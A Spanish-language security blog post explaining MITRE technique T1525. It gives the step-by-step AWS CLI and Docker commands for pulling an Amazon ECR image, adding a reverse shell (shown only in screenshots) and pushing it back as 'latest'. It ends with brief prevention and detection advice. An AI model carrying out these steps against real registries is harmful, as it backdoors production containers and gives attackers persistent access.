---
title: "Persistencia en AWS con implantes en imágenes de contenedores"
author: Adan Alvarez
classes: wide
excerpt: "Una de las tácticas más comunes cuando un atacante logra el acceso inicial es obtener persistencia. El objetivo de esta es mantenerse en la infraestructura pese a que se reinicie el equipo, las contraseñas o haya cualquier interrupción que pueda interrumpir el acceso inicial. Una de las técnicas utilizadas para obtener persistencia en AWS si en la cuenta se usa Amazon Elastic Container Registry (ECR) es añadiendo implantes en las imágenes de los contenedores."
categories:
  - AWS
tags:
  - Red Team
  - Persistencia
  - MITRE ATT&CK
  - Containers
---
Una de las tácticas más comunes cuando un atacante logra el acceso inicial es obtener persistencia. El objetivo de esta es mantenerse en la infraestructura pese a que se reinicie el equipo, las contraseñas o haya cualquier interrupción que pueda interrumpir el acceso inicial. Una de las técnicas utilizadas para obtener persistencia en AWS si en la cuenta se usa [Amazon Elastic Container Registry (ECR)](https://aws.amazon.com/es/ecr/) es añadiendo implantes en las imágenes de los contenedores.
{: style="text-align: justify;"}

Esta técnica la encontramos bajo en nombre [*Implant Container Image*](https://attack.mitre.org/techniques/T1525/) en [Mitre Att&ck](https://donttouchmy.net/mitre-attck-defiende-teniendo-en-cuenta-las-tacticas-y-tecnicas-del-adversario/) y tiene el ID T1525.
{: style="text-align: justify;"}

Estos son los pasos que podría seguir un atacante para lograr persistencia en AWS tras conseguir un usuario con permisos al ECR:
{: style="text-align: justify;"}

En primer lugar, es necesario listar los repositorios que existen en la cuenta:
{: style="text-align: justify;"}
```
aws ecr describe-repositories
```
Tras descubrir los repositorios, se pueden listar las imágenes del repositorio con el comando:
{: style="text-align: justify;"}
```
aws ecr describe-images --repository-name NOMBREREPOSITORIO
```
Una vez obtenido el nombre del repositorio y de las imágenes, un atacante podría descargar una de ellas, modificarla añadiendo código malicioso y subirla de nuevo. Esto se podría realizar de la siguiente manera:
{: style="text-align: justify;"}

Para poder descargar imágenes necesitaremos un cliente Docker , pero antes, deberemos obtener un token de autenticación y autenticar nuestro cliente Docker al registro:
{: style="text-align: justify;"}
```
aws ecr get-login-password --region REGION | docker login --username AWS --password-stdin IDCUENTAAWS.dkr.ecr.REGION.amazonaws.com
```
Tras la autenticación se podrá descargar una imagen, en el siguiente comando se descargará la imagen con el tag latest:
{: style="text-align: justify;"}
```
docker pull IDCUENTAAWS.dkr.ecr.REGION.amazonaws.com/NOMBREREPOSITORIO:latest
```
Una vez descargada la imagen, será posible ejecutarla en local:
{: style="text-align: justify;"}
```
docker run --detach NOMBREIMAGEN
```
Y acceder a ella para realizar modificaciones:
{: style="text-align: justify;"}
```
docker exec -it IDCONTAINER bash
```
Las modificaciones para conseguir persistencia dependerán de la imagen descargada. En el siguiente ejemplo tenemos una imagen que ejecuta al iniciar el script run_apache.sh
{: style="text-align: justify;"}

[![persistencia en AWS](https://donttouchmy.net/wp-content/uploads/2020/09/init-300x77.png)](https://donttouchmy.net/wp-content/uploads/2020/09/init.png)

Por lo tanto, un método para poder obtener persistencia es modificar el script que se ejecuta al inicio con una reverse shell:
{: style="text-align: justify;"}

[![](https://donttouchmy.net/wp-content/uploads/2020/09/modify_init-300x33.png)](https://donttouchmy.net/wp-content/uploads/2020/09/modify_init.png)

Tras realizar los cambios será necesario guardar el contenedor modificado como nueva imagen:
{: style="text-align: justify;"}
```
docker commit CONTAINERID NOMBREIMAGEN
```
Después de esto añadimos el tag que se estaba utilizando en ECR, en este caso latest:
{: style="text-align: justify;"}
```
docker tag NOMBREIMAGEN:latest IDCUENTAAWS.dkr.ecr.REGION.amazonaws.com/NOMBREREPOSITORIO:latest
```
y por último hacemos un push para que la imagen se almacene en el registro de AWS.
{: style="text-align: justify;"}

docker push IDCUENTAAWS.dkr.ecr.REGION.amazonaws.com/NOMBREREPOSITORIO:latest

Tras esto solo quedará esperar que la nueva imagen se ejecute y recibir la reverse shell:
{: style="text-align: justify;"}

[![persistencia en AWS](https://donttouchmy.net/wp-content/uploads/2020/09/reverse_shell-300x63.png)](https://donttouchmy.net/wp-content/uploads/2020/09/reverse_shell.png)

Además de manualmente, esta técnica puede ser realizada de forma algo más automática mediante [CCAT](https://github.com/RhinoSecurityLabs/ccat).
{: style="text-align: justify;"}

La prevención de esta técnica pasa por una correcta gestión de permisos. Además, podemos realizar verificaciones periódicas de integridad para confirmar que las imágenes no han sido modificadas. Para tratar de detectar esta técnica es importante controlar las peticiones a [Amazon Elastic Container Registry](https://aws.amazon.com/es/ecr/).
{: style="text-align: justify;"}
